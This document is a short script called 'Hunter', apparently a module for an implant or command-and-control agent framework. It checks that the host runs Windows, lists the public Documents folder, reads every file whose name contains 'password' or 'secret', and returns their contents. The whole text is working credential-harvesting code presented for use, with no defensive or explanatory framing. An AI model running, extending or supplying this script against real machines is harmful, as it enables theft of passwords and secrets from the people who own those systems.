print("Starting Hunter...");

// This script walks a Windows path; bail out early elsewhere.
if internal_env("OS") != "Windows_NT" {
    return "hunter targets Windows hosts only.";
}

let base_dir = "C:\\Users\\Public\\Documents";

// internal_ls returns one line: a compact JSON array of
// {name, is_dir, size, perms, mod_time} objects, or an {"error": ...}
// object when the path cannot be read.
let files_str = internal_ls(base_dir);

let err = internal_json_get(files_str, "error");
if err != "null" {
    return "Error listing " + base_dir + ": " + err;
}

let found_data = "";
let i = 0;
loop {
    let name = internal_json_get(files_str, i.to_string() + ".name");
    if name == "null" { break; }
    let is_dir = internal_json_get(files_str, i.to_string() + ".is_dir");
    i += 1;
    if is_dir == "true" { continue; }

    let lower = name.to_lower();
    if lower.contains("password") || lower.contains("secret") {
        let full_path = base_dir + "\\" + name;
        let content = internal_read(full_path);
        found_data = found_data + "\n--- " + full_path + " ---\n" + content;
    }
}

if found_data.len() > 0 {
    return found_data;
} else {
    return "No secrets found in public docs.";
}
